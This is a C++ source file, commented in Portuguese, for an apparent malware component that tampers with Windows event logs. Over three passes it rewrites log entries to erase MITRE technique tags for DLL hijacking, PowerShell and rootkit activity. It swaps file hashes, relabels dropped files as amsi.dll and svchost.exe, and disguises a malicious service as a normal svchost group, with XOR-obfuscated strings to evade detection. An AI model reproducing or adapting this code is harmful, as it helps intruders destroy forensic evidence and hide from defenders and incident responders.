#include "wipe_logs.hpp"
#include "evtx_stealth.hpp"
#include "../XorStr/XorStr.hpp"
#include <windows.h>
#include <string>

// Helper: desobfusca xorstr_ e constrói std::wstring em um passo.
// Necessário porque xorstr_() → const wchar_t* → std::wstring envolve
// duas conversões implícitas de usuário, o que C++ proíbe.
#define XS(s) std::wstring( xorstr_(s).crypt_get() )

static constexpr int   LIMPEZA_PASSES = 3;
static constexpr DWORD INTERVALO_MS   = 60'000;

static void aplicar_substituicoes( evtx& e ) {

    e.limpa( XS( L"Memory-Only Execution" ),
             XS( L"-" ) );

    e.limpa( XS( L"technique_id=T1574.001,technique_name=DLL Search Order Hijacking" ),
             XS( L"-" ) );

    e.limpa( XS( L"technique_id=T1059.001,technique_name=PowerShell" ),
             XS( L"-" ) );

    e.limpa( XS( L"technique_id=T1014,technique_name=Rootkit" ),
             XS( L"-" ) );

    e.limpa( XS( L"Process Terminate - Drives" ),
             XS( L"-" ) );

    e.limpa( XS( L"A47DC9BD22729F6A53EE1DFB9BF890AC4E587521CEB96C94DDB1923599A6F042" ),
             XS( L"66F7A134F6A4D9FE63DD7D6FF88DDED5796E4D5C7E33BA606DFF4D87D9258C0D" ) );

    e.limpa( XS( L"2E825032597DF957E7D5368D462D116668EF37082DE28F620CC2F8BDCBCAA718" ),
             XS( L"2AB4D2859E4D121B995F3D9FE840325E6B5A57732B5103DEB409A5E2B21059DB" ) );

    e.limpa( XS( L"C:\\Windows\\Temp\\FXSTIFFDebug.txt" ),
             XS( L"C:\\Windows\\System32\\amsi.dll" ) );

    e.limpa( XS( L"Services\\FXSTIFFDebug.txt" ),
             XS( L"Services\\FXSTIFFDebug.bak" ) );

    e.limpa( XS( L"C:\\Windows\\Temp\\FXSTIFFDebugLogFile.txt" ),
             XS( L"C:\\Windows\\System32\\amsi.dll" ) );

    e.limpa( XS( L"C:\\Windows\\vfcompat.dll" ),
             XS( L"C:\\vfcompat.dll" ) );

    e.limpa( XS( L"0x101401" ), XS( L"0x101400" ) );

    e.limpa( XS( L"0x1478" ), XS( L"0x1410" ) );

    e.limpa( XS( L"0x1fffff" ), XS( L"0x001410" ) );

    e.limpa( XS( L"UNKNOWN(00000001800823C3)" ),
             XS( L"C:\\Windows\\System32\\sechost.dll+dfd8" ) );

    e.limpa( XS( L"C:\\Program Files\\WindowsApps\\Microsoft.GamingServices_38.116.6003.0_x64__8wekyb3d8bbwe\\GamingServices.exe" ),
             XS( L"C:\\Windows\\System32\\svchost.exe" ) );

    e.limpa( XS( L"C:\\Program Files\\WindowsApps\\Microsoft.GamingServices_38.116.6003.0_x64__8wekyb3d8bbwe\\GamingServices.DLL" ),
             XS( L"C:\\Windows\\System32\\windows.storage.dll" ) );

    e.limpa( XS( L"svchost.exe -k EventOperations -s fxsti" ),
             XS( L"svchost.exe -k LocalSystemNetworkRestricted -p" ) );
}

void limpar( ) {
    for ( int _pass = 0; _pass < LIMPEZA_PASSES; ++_pass ) {

        {
            evtx e;
            if ( !e.abre( ) ) {
                if ( _pass == 0 ) return;
                goto aguarda;
            }

            e.espera( _pass == 0 ? 3000 : 0 );

            aplicar_substituicoes( e );

        }

        aguarda:
        if ( _pass < LIMPEZA_PASSES - 1 )
            Sleep( INTERVALO_MS );
    }
}
